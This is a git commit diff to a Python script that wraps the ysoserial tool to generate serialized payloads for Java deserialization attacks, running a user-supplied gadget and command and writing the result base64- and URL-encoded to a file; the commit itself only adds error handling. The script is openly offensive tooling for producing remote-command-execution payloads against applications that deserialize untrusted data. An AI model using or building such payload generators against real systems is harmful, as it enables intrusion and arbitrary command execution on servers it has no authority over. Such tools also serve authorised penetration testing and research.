51e834a731402e4a68d1798eafcea10cb5a030da
can <47246431+canozal@users.noreply.github.com>
2023-02-23 09:30:34 +0300

    Update ysoserial_payload_generator.py

--- ysoserial_payload_generator.py
+++ ysoserial_payload_generator.py
@@ -7,23 +7,28 @@ import urllib.parse
 YSOSERIAL_COMMAND = 'java -jar ysoserial.jar'
 
 def main():
-    # Set up the command line arguments
-    parser = argparse.ArgumentParser(description='Generate serialized payloads for Java deserialization attacks using ysoserial.')
-    parser.add_argument('-g', '--gadget', required=True, help='the gadget to use')
-    parser.add_argument('-c', '--command', required=True, help='the command to execute')
-    parser.add_argument('-o', '--output', default='payload.txt', help='the file to write the payload to (default: payload.txt)')
-    args = parser.parse_args()
+    try:
+        # Set up the command line arguments
+        parser = argparse.ArgumentParser(description='Generate serialized payloads for Java deserialization attacks using ysoserial.')
+        parser.add_argument('-g', '--gadget', required=True, help='the gadget to use')
+        parser.add_argument('-c', '--command', required=True, help='the command to execute')
+        parser.add_argument('-o', '--output', default='payload.txt', help='the file to write the payload to (default: payload.txt)')
+        args = parser.parse_args()
 
-    # Generate the payload
-    payload_command = '{} {} "{}"'.format(YSOSERIAL_COMMAND, args.gadget, args.command)
-    payload_bytes = subprocess.check_output(payload_command)
-    payload_base64 = base64.b64encode(payload_bytes).decode('utf-8')
-    payload_urlencoded = urllib.parse.quote(payload_base64, safe='')
-    
-    # Write the payload to a file
-    with open(args.output, 'w') as f:
-        f.write(payload_urlencoded)
-    print('Payload written to', args.output)
+        # Generate the payload
+        payload_command = '{} {} "{}"'.format(YSOSERIAL_COMMAND, args.gadget, args.command)
+        payload_bytes = subprocess.check_output(payload_command)
+        payload_base64 = base64.b64encode(payload_bytes).decode('utf-8')
+        payload_urlencoded = urllib.parse.quote(payload_base64, safe='')
+
+        # Write the payload to a file
+        with open(args.output, 'w') as f:
+            f.write(payload_urlencoded)
+        print('Payload written to', args.output)
+    except subprocess.CalledProcessError as e:
+        print('ERROR: Failed to generate payload:', e)
+    except IOError as e:
+        print('ERROR: Failed to write payload to file:', e)
 
 if __name__ == '__main__':
     main()
